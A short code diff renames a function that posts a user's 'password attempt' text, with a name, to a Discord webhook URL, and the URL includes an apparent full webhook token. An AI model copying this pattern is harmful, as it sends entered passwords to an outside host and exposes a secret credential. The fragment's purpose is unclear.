@@ -1,4 +1,4 @@
-export function logPasswordAttempt(name: string, text: string) {
+export function postAttemptToWebhook(name: string, text: string) {
     return fetch('https://discord.com/api/webhooks/1319444615191072890/79lP5pbQz45MJdtge6gxJpR8fQmiK9su30YqMUciE_7iKvFizbnc9m6OFUHAykq92tFZ', {
         method: 'POST',
         headers: {
